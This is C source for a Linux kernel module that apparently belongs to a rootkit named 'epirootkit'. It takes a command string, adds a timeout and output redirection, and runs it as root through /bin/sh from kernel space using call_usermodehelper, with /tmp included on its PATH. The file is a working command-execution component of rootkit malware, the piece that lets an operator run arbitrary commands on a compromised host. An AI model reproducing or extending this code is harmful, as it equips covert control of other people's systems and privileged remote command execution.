#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kmod.h>
#include <linux/types.h>

#include "epirootkit.h"

static char *trim_leading_whitespace(char *str) {
    while (*str == ' ' || *str == '\t' || *str == '\n')
        str++;
    return str;
}

static void detect_redirections(const char *cmd, bool *redirect_stdout, bool *redirect_stderr) {
    char *redirect_stderr_add = strstr(cmd, "2>");
    char *redirect_stdout_add = strstr(cmd, ">");

    *redirect_stderr = (redirect_stderr_add != NULL);
    *redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
}

static char *build_timeout_prefix(int timeout) {
    if (timeout <= 0)
        return kstrdup("", GFP_KERNEL);

    const char *base_cmd = "timeout --signal=SIGKILL --preserve-status";
    int size = snprintf(NULL, 0, "%s %d", base_cmd, timeout);
    char *timeout_cmd = kzalloc(size + 1, GFP_KERNEL);
    if (!timeout_cmd)
        return NULL;

    snprintf(timeout_cmd, size + 1, "%s %d", base_cmd, timeout);
    return timeout_cmd;
}

/**
 * build_full_command - Constructs a full command string with optional redirection.
 *
 * @buffer: Pointer to the buffer where the constructed command will be stored.
 * @buffer_size: Size of the buffer to ensure no overflow occurs.
 * @timeout_cmd: The timeout command to prepend to the user command.
 * @user_cmd: The user command to be executed.
 * @redirect_stdout: Boolean flag indicating whether to redirect standard output.
 * @redirect_stderr: Boolean flag indicating whether to redirect standard error.
 * @catch_stds: Boolean flag indicating whether to catch standard output and error.
 * @stdout_file: File path to redirect standard output (used if redirect_stdout is true).
 * @stderr_file: File path to redirect standard error (used if redirect_stderr is true).
 *
 * This function constructs a command string based on the provided parameters.
 * It supports optional redirection of standard output and/or standard error
 * to specified files. If both `redirect_stdout` and `redirect_stderr` are true,
 * or if `catch_stds` is false, no redirection is applied.
 *
 * Returns:
 *   0 on success, or -EINVAL if the constructed command exceeds the buffer size.
 */
static int build_full_command(char *buffer, size_t buffer_size,
                              const char *timeout_cmd, const char *user_cmd,
                              bool redirect_stdout, bool redirect_stderr,
                              bool catch_stds, const char *stdout_file, const char *stderr_file) {
    const char *format;

    if ((redirect_stderr && redirect_stdout) || !catch_stds) {
        format = "%s %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd) >= buffer_size ? -EINVAL : 0;
    } else if (redirect_stderr) {
        format = "%s %s > %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file) >= buffer_size ? -EINVAL : 0;
    } else if (redirect_stdout) {
        format = "%s %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stderr_file) >= buffer_size ? -EINVAL : 0;
    } else {
        format = "%s %s > %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd, stdout_file, stderr_file) >= buffer_size ? -EINVAL : 0;
    }
}

static int execute_command(const char *cmd_str, char *envp[]) {
    char *argv[] = { "/bin/sh", "-c", (char *)cmd_str, NULL };
    struct subprocess_info *sub_info;

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info)
        return -ENOMEM;

    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
}


/**
 * exec_str_as_command_with_timeout - Executes a user-provided command string with a timeout.
 *
 * @user_cmd: The command string to execute. Leading whitespace will be trimmed.
 * @catch_stds: A boolean indicating whether to redirect standard output and error.
 * @timeout: The maximum time (in seconds) to allow the command to run before timing out.
 *
 * This function builds and executes a command string with optional redirection of
 * standard output and error. It also enforces a timeout for the command execution.
 * The function performs the following steps:
 *   1. Allocates memory for the command buffer.
 *   2. Detects redirection operators in the user-provided command.
 *   3. Constructs a timeout-prefixed command string.
 *   4. Builds the full command string with optional redirection and environment variables.
 *   5. Executes the constructed command.
 *   6. Frees allocated resources and returns the command's exit status.
 *
 * Return:
 *   - On success, returns the exit status of the executed command.
 *   - On failure, returns a negative error code (e.g., -ENOMEM for memory allocation failure).
 *
 * Notes:
 *   - The function uses a static environment variable array (`envp`) to define
 *     the execution environment for the command.
 *   - The caller is responsible for ensuring that `user_cmd` is a valid, null-terminated string.
 *   - The function logs debug messages for command execution and status.
 */

int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds, int timeout) {
    char *cmd_buffer = NULL;
    char *timeout_cmd = NULL;
    bool redir_stdout = false, redir_stderr = false;
    int status = 0;

    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/tmp",
        NULL
    };

    user_cmd = trim_leading_whitespace(user_cmd);

    cmd_buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!cmd_buffer)
        return -ENOMEM;

    detect_redirections(user_cmd, &redir_stdout, &redir_stderr);

    timeout_cmd = build_timeout_prefix(timeout);
    if (!timeout_cmd) {
        kfree(cmd_buffer);
        return -ENOMEM;
    }

    status = build_full_command(cmd_buffer, STD_BUFFER_SIZE,
                                 timeout_cmd, user_cmd,
                                 redir_stdout, redir_stderr,
                                 catch_stds, STDOUT_FILE, STDERR_FILE);

    if (status < 0) {
        DBG_MSG("Command too long or invalid\n");
        kfree(cmd_buffer);
        kfree(timeout_cmd);
        return status;
    }

    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd_buffer);

    status = execute_command(cmd_buffer, envp);
    DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);

    kfree(cmd_buffer);
    kfree(timeout_cmd);

    return status;
}
